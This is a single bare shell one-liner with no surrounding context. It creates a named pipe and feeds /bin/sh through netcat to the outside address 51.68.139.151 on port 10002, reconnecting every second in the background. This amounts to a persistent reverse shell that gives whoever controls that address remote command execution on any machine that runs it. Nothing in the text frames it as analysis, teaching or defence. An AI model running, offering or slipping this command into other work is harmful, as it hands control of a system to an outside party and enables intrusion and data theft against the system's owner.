pipe="/tmp/$((1 + RANDOM % 1000))"; mkfifo $pipe; while true; do cat $pipe | /bin/sh 2>&1 | nc 51.68.139.151 10002 > $pipe; sleep 1; done &
